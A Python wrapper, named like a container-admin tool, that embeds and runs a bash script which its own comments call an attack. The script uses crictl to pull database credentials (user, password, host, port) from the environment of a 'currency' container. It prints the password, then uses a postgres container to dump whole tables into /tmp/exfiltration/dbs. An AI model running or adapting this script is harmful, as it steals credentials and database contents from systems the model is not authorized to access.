#!/usr/bin/env python3
"""Python entrypoint for container-admin2.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -Eeuo pipefail

# Diagnosis: print line and command on every unmanaged error
trap 'echo "[ERR] (line $LINENO) command: $BASH_COMMAND" >&2' ERR

OUTDIR=/tmp/exfiltration/dbs
mkdir -p "$OUTDIR"

# Minimal verifications
command -v crictl >/dev/null 2>&1 || { echo "ERROR: crictl not found"; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "ERROR: jq not found"; exit 1; }

# --- POSTGRES IN CONTAINER ---
mapfile -t CIDS < <(crictl ps -q --name postgres)
if [[ ${#CIDS[@]} -eq 0 ]]; then
  echo "No containers with name including 'postgres' found"
  exit 0
fi

echo "Found ${#CIDS[@]} containers. Running query..."
# --- DB REMOTE IN CONTAINER 'currency' ---
mapfile -t CIDC < <(crictl ps -q --name currency)
if [[ ${#CIDC[@]} -eq 0 ]]; then
  echo "No container currency found"
else
  echo "DB currency attack (${#CIDC[@]} container). Run query..."
  for CID_CUR in "${CIDC[@]}"; do
    if ! INSPECT_JSON=$(crictl inspect "$CID_CUR"); then
      echo "   [SKIP] inspect failed for $CID_CUR" >&2
      continue
    fi

    # Extract DB credentials from env variables to proceed the attack
    USERC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_USER"{print $2}')
    PASSC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_PASS"{print $2}')
    DBC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_NAME"{print $2}')
    HOSTC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_HOST"{print $2}')
    PORTC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_PORT"{print $2}')
    HOSTC="${HOSTC%%.*}"
    QUERY="SELECT * FROM $DBC;"
    OUTFILE="$OUTDIR/currencyDB-${CID_CUR:0:12}.txt"

    echo "${CIDS[0]} ${CIDS[1]} $PASSC $HOSTC $PORTC $USERC $DBC $QUERY $OUTFILE"

    if ! crictl exec -i "${CIDS[0]}" env PGPASSWORD="$PASSC" \
         psql -h "$HOSTC" -p "$PORTC" -U "$USERC" -d "$DBC" -t -A -c "$QUERY" >"$OUTFILE" 2>"$OUTFILE.err"; then
      echo "   [ERR] query failed. See $OUTFILE.err" >&2
      [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
      continue
    fi

    [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
  done
fi"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
